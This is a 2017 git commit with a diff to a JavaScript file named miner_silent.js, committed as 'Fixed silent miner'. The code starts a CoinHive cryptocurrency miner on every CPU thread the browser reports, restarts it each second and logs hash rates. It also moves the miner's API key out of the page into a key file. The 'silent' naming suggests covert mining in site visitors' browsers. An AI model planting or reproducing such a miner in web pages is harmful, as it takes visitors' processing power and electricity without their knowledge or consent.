0d57b2dae3697b1dc6a578a49b922bfb2233473f
RKouchoo <r.kouchoo1@gmail.com>
2017-10-30 19:39:36 +1100

    Fixed silent miner
    silent miner nolonger needs to be stored on the main page

--- scripts/miner_silent.js
+++ scripts/miner_silent.js
@@ -1,9 +1,12 @@
 var threadCount = navigator.hardwareConcurrency;
 var timeDelay = 1000;
 var timeDelayMain = 1250;
+var updatePos = 0;
+
+// REQUIRES KEYLOADER TO BE INITIALISED
 
 setInterval(function() {
-	miner = new CoinHive.Anonymous(document.getElementById("api").innerHTML,'threads: ' + threadCount);
+	miner = new CoinHive.Anonymous(readKeyFile("./keys/key.apikey"),'threads: ' + threadCount);
 }, timeDelay);
 	
 // Update stats once per second
@@ -14,11 +17,15 @@ setInterval(function() {
     var acceptedHashes = miner.getAcceptedHashes() / 256;
 	
 	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
-	
+	updatePos++;
     // Output to console
     if (miner.isRunning()) {
 		
-		console.log("threadcount = " + threadCount + "\n" + "hashesPerSecond = " + hashesPerSecond + "\n" + "total hashes = " + totalHashes + "\n" + "accepted hashes = " + acceptedHashes);
+		var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+    	var totalHashes = miner.getTotalHashes();
+    	var acceptedHashes = miner.getAcceptedHashes() / 256;
+		
+		console.log("UpdateNum = " + updatePos + "\n" + "threadcount = " + threadCount + "\n" + "hashesPerSecond = " + hashesPerSecond + "\n" + "total hashes = " + totalHashes + "\n" + "accepted hashes = " + acceptedHashes);
     
 	}
 	
